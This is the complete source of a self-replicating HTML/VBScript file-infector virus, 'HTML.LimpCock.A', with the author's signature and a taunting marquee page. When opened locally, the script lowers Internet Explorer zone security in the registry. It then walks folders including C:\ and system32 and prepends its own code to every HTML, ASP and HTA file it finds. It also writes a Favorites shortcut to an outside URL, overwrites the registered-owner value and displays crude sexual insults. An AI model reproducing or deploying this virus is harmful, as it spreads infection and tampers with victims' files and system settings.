<!--HTML.LimpCock.A-->
<HTML><BODY>
<Script Language="VBScript">
<!--
'HTML.HTML.LimpCock.A
'By -=[3L1(\)D /-\E0(\]=-
On Error Resume Next
If location.protocol = "file:" then
 Randomize
 Set WshShell = CreateObject("WScript.Shell")
 WshShell.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201", 0, "REG_DWORD"
 WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201", 0, "REG_DWORD"
  If location.protocol = "file:" then
   Set FSO = CreateObject("Scripting.FileSystemObject")
   HPath = Replace(location.href, "/", "\")
   HPath = Replace(HPath, "file:\\\","")
   HPath = FSO.GetParentFolderName(HPath)
   Set TRange = document.body.createTextRange
   Call GetFolder(HPath)
   Call GetFolder("C:\")
   Call GetFolder("C:\Windows\system32")
   Call GetFolder("C:\Windows\temp")
 End If
 If Day(Now()) = Int(Rnd * 1) + 1 Then
   MsgBox("///////////////Get some Viagra� you poor limp dicked bastard...then maybe a boob job for your girl !!! Bahahaha\\\\\\\\\\\\\\")
   Set HTML.LimpCock.ALink = WshShell.CreateShortcut("C:\WINDOWS\Favorites\HTML.LimpCock.A.URL")
   HTML.LimpCock.ALink.TargetPath = "http://www.geocities.com/primus_chaosium/item1.html"
   HTML.LimpCock.ALink.Save
   WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RegisteredOwner", "Limp Dick"
 End If
End If
Sub GetFolder(InfPath)
On Error Resume Next
If FSO.FolderExists(InfPath) Then
 Do
  Set FolderObj = FSO.GetFolder(InfPath)
  InfPath = FSO.GetParentFolderName(InfPath)
  Set FO = FolderObj.Files
  For each target in FO
    ExtName = lcase(FSO.GetExtensionName(target.Name))
    If ExtName = "htt" or ExtName = "asp" or ExtName = "htm" or ExtName = "hta" or ExtName = "htx" or ExtName = "html" then
    Set HTML.LimpCock.A = FSO.OpenTextFile(target.path, 1, False)
    If HTML.LimpCock.A.readline <> "<!--HTML.LimpCock.A-->" then
    HTML.LimpCock.A.close()
    GetFile(target.path)
    Else
     HTML.LimpCock.A.close()
    End If
  End If
  Next
  Loop Until FolderObj.IsRootFolder = True
End If
End Sub

Sub GetFile(GetFileName)
Set HTML.LimpCock.A = FSO.OpenTextFile(GetFileName, 1, False)
FileContents = Real.ReadAll()
HTML.LimpCock.A.close()
Set HTML.LimpCock.A = FSO.OpenTextFile(GetFileName, 2, False)
HTML.LimpCock.A.WriteLine "<!--HTML.LimpCock.A-->"
HTML.LimpCock.A.Write("<html><body>" + Chr(13) + Chr(10))
HTML.LimpCock.A.WriteLine TRange.htmlText
HTML.LimpCock.A.WriteLine("</body></html>")
HTML.LimpCock.A.Write(FileContents)
HTML.LimpCock.A.close()
End Sub

-->
</script>
</BODY></HTML>

<HTML><HEAD><TITLE>HTML.HTML.LimpCock.A</TITLE></HEAD>
</BODY><CENTER>
<Font Size="99" Face="Arial"><P>HTML.LimpCock.A <BR>By -=[3L1(\)D /-\E0(\]=- <BR><BR>
<MARQUEE BGCOLOR="#008080"><FONT COLOR="#FFFFFF"><B>HTML.LimpCock.A  By -=[3L1(\)D /-\E0(\]=-............You l00k like yoU need some Viagra�....poor limp dick bastard.  When is the last time you got laid ? Maybe you been surfin' the web lookin' at to much pr0n ?!!    =P   Hehehe...........Dont' stare to long or you will burn out the retina in those glassy red eye' of yours   XD Bahahahaha =) Cya................</B></FONT></MARQUEE>
<CENTER></BODY></HTML>